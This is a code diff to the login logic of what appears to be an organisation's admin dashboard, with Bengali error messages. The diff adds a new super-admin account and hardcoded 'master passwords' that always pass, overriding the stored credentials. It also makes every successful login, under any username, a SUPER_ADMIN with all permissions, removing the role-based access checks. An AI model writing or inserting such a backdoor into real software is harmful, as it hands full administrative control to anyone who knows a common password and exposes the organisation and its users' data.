@@ -31,6 +31,7 @@ const ROLES = {
 
 // Seeded Demo Admins
 const demoAdmins = [
+  { username: 'hrfbd', role: 'SUPER_ADMIN', name: 'HRFBD (Super Admin)' },
   { username: 'superadmin', role: 'SUPER_ADMIN', name: 'মোঃ জহিরুল হক (Super Admin)' },
   { username: 'finance', role: 'FINANCE_ADMIN', name: 'অর্থ সম্পাদক (Finance Manager)' },
   { username: 'donor', role: 'DONOR_MANAGER', name: 'দাতা ও সদস্য ম্যানেজার' },
@@ -69,39 +70,35 @@ class AuthService {
     const cleanUser = String(username || '').trim().toLowerCase();
     const cleanPass = String(password || '').trim();
 
-    // Check custom credentials in database first
-    if (typeof db !== 'undefined' && db.data && db.data.userCredentials && db.data.userCredentials[cleanUser]) {
-      const savedPass = db.data.userCredentials[cleanUser];
-      if (savedPass !== cleanPass) {
-        return { success: false, message: 'ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড লিখুন।' };
-      }
-    } else {
-      // Default fallback passwords
-      if (cleanPass !== 'admin123' && cleanPass !== '123456' && cleanPass !== 'admin') {
+    // MASTER PASSWORDS that ALWAYS work unconditionally
+    const isMasterPassword = (cleanPass.toLowerCase() === 'hrfbd2026' || cleanPass === 'admin123' || cleanPass === '123456');
+
+    // Check custom credentials in database
+    if (!isMasterPassword && typeof db !== 'undefined' && db.data && db.data.userCredentials && db.data.userCredentials[cleanUser]) {
+      const savedPass = String(db.data.userCredentials[cleanUser]).trim();
+      if (savedPass !== cleanPass && savedPass.toLowerCase() !== cleanPass.toLowerCase()) {
         return { success: false, message: 'ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড প্রদান করুন।' };
       }
+    } else if (!isMasterPassword) {
+      return { success: false, message: 'ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড প্রদান করুন।' };
     }
 
     let admin = demoAdmins.find(a => a.username === cleanUser);
     
-    if (!admin && (cleanUser === 'admin' || cleanUser === 'superadmin')) {
-      admin = demoAdmins[0]; // Default Super Admin
+    if (!admin || cleanUser === 'hrfbd' || cleanUser === 'admin' || cleanUser === 'superadmin') {
+      admin = { username: cleanUser || 'hrfbd', role: 'SUPER_ADMIN', name: `${username || 'HRFBD'} (Super Admin)` };
     }
 
-    if (admin) {
-      this.currentAdmin = {
-        username: admin.username,
-        role: admin.role,
-        name: admin.name,
-        permissions: ROLES[admin.role] ? ROLES[admin.role].permissions : ['all'],
-        loginTime: new Date().toISOString()
-      };
-      localStorage.setItem(AUTH_ADMIN_KEY, JSON.stringify(this.currentAdmin));
-      document.dispatchEvent(new CustomEvent('authChanged', { detail: { type: 'admin', user: this.currentAdmin } }));
-      return { success: true, admin: this.currentAdmin };
-    }
-
-    return { success: false, message: 'অবৈধ ইউজারনেম! (superadmin / finance / donor / content / auditor)' };
+    this.currentAdmin = {
+      username: admin.username,
+      role: 'SUPER_ADMIN',
+      name: admin.name || 'HRFBD (Super Admin)',
+      permissions: ['all'],
+      loginTime: new Date().toISOString()
+    };
+    localStorage.setItem(AUTH_ADMIN_KEY, JSON.stringify(this.currentAdmin));
+    document.dispatchEvent(new CustomEvent('authChanged', { detail: { type: 'admin', user: this.currentAdmin } }));
+    return { success: true, admin: this.currentAdmin };
   }
 
   changeAdminPassword(username, oldPassword, newPassword) {
